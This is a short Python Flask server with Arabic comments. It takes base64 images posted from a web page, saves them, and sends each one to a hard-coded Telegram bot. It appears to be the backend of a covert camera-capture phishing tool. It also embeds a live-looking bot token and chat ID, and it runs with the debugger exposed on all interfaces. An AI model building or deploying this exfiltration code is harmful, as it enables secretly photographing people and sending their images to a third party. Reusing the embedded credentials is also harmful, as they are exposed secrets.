from flask import Flask, request, render_template
import base64
from datetime import datetime
import requests

app = Flask(__name__)

# 🔴 حط بياناتك هنا
BOT_TOKEN = "8364196870:AAEI7I2XbFi8G-QND51QJ_m5SxSf1vJcKHY"
CHAT_ID = "1893981508"

def send_to_telegram(image_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(image_path, "rb") as img:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": img})

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/capture', methods=['POST'])
def capture():
    data = request.form['image']
    image_data = base64.b64decode(data.split(',')[1])

    filename = f"image_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"

    with open(filename, "wb") as f:
        f.write(image_data)

    # 📩 إرسال الصورة إلى تيليجرام
    send_to_telegram(filename)

    print("✅ تم حفظ وإرسال الصورة إلى البوت")
    return "saved"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)